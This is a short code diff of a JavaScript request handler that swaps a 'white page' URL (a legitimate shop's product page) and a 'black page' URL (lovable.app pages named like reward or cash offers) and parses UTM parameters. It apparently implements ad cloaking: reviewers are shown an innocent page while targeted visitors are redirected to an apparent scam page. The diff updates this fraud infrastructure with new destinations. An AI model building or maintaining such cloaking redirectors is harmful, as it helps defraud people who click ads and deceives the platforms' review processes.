@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://insignia.com.pk/collections/men-shoes/products/men-casual-driving-mocs-mc4037-brown";
-    const blackPageURL = "https://rewardfalltheme.lovable.app/";
+    const whitePageURL = "https://gearwrenchshop.com/products/gearwrench-81298t-3-pc-1-4-3-8-1-2-drive-90-tooth-dual-material-locking-flex-head-ratchet-set";
+    const blackPageURL = "https://cashhpplogo.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
